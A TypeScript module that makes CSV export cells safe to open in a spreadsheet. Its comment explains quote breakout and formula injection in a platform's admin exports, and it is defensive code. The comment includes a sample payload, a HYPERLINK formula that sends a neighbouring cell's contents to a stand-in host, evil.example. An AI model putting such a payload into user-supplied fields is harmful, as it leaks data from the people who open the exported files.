/**
 * Building a CSV cell that a spreadsheet will not execute.
 *
 * WHY THIS IS A SHARED MODULE AND NOT A HELPER IN ONE FILE
 * --------------------------------------------------------
 * It already was a helper in one file. `csvCell` was written for the audit-log
 * export and left private to audit-log-actions.ts, and the platform's other
 * three CSV exports each grew their own cell-quoting expression:
 *
 *   admin/export/users               `"${String(c).replace(/"/g, '""')}"`
 *   admin/export/cooperative-members `"${String(c).replace(/"/g, '""')}"`
 *   admin/wave/reports/export        `"${cell}"`
 *
 * The first two double embedded quotes and neutralise nothing. The third does
 * not even do that. All three carry values a user typed into their own profile.
 *
 * TWO SEPARATE PROBLEMS
 * ---------------------
 * 1. QUOTING. A value containing `"` must have it doubled or the field ends
 *    early and everything after it shifts into the wrong columns. The WAVE
 *    export interpolates raw, so an applicant whose business name contains a
 *    quote can add columns to an admin's spreadsheet.
 *
 * 2. FORMULA INJECTION. Correct quoting does not help here. Excel, LibreOffice
 *    and Google Sheets treat a cell beginning with `=`, `+`, `-` or `@` as a
 *    formula when the file is opened, and the quotes are stripped before that
 *    decision is made. A user whose full name is
 *
 *        =HYPERLINK("https://evil.example?d="&A1,"Payroll")
 *
 *    produces a working link in the admin's spreadsheet, rendered with whatever
 *    label they chose, carrying a neighbouring cell's contents. Older Excel
 *    reaches further than that. Leading tab and carriage return are included
 *    because they are stripped before the same check.
 *
 * The fix is one character: a leading apostrophe makes the spreadsheet treat
 * the cell as text. The users export already does this for `phone`, to keep
 * leading zeros — so the technique was known and applied to exactly the one
 * column where the motivation was cosmetic rather than security.
 *
 * WHAT THIS IS NOT
 * ----------------
 * Not an escape for HTML, SQL or shell. A CSV cell is being made safe for a
 * spreadsheet to open, and nothing else.
 */

/** Characters a spreadsheet reads as "this cell is a formula". */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Renders one value as a quoted, formula-safe CSV field.
 *
 * Always returns a quoted field, including for empty values — uniform quoting
 * means a value that later gains a comma cannot break the row.
 */
export function csvCell(value: unknown): string {
    const text = String(value ?? "");
    const neutralised = FORMULA_LEAD.test(text) ? `'${text}` : text;
    return `"${neutralised.replace(/"/g, '""')}"`;
}

/** Renders one row. */
export function csvRow(cells: unknown[]): string {
    return cells.map(csvCell).join(",");
}

/**
 * Renders a whole document from a header row and body rows.
 *
 * Headers go through the same function as everything else. They are static
 * today, but a header assembled from a column the caller chose is exactly how
 * the one unescaped path appears again.
 */
export function csvDocument(headers: unknown[], rows: unknown[][]): string {
    return [csvRow(headers), ...rows.map(csvRow)].join("\n");
}
